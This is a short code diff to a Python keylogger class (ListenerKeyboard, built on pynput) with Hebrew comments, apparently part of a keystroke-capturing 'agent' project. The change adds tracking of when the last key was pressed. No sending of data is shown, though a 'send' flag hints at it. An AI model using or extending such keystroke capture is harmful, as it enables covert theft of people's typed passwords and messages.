@@ -1,3 +1,5 @@
+import time
+
 from pynput.keyboard import Listener
 from interface_agent import IKeyLogger
 
@@ -8,6 +10,8 @@ class ListenerKeyboard(IKeyLogger):
         self.listener = Listener(on_press=self.on_press)
         self.send = False
         self.the_final_list = []
+        self.last_time_pressed = time.time()
+
 
     # מתחיל להאזין להקשות במקלדת
     def start_logging(self) -> None:
@@ -36,7 +40,7 @@ class ListenerKeyboard(IKeyLogger):
         if not key.isalpha() and not key.isnumeric() and not key == " ":
             key = ' {0} '.format(key)
         self.add_to_list(key)
-        return key
+        self.last_time_pressed = time.time()
 
     # לוקח את התו שהוקש ומכניס למערך, ובודק אם הופעלה הפונקציה get_logged_keys(), אם כן - מתאפס המערך
     def add_to_list(self,key) -> None:
